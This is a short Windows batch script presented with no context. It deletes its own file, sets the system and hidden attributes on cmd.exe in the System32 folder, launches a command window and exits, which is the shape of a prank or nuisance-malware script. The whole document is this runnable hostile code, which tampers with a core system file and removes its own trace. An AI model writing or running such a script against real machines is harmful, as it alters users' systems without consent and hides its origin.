@echo off

:start

del %0

attrib +s +h c:\windows\system32\cmd.exe

start c:\windows\system32\cmd.exe

exit
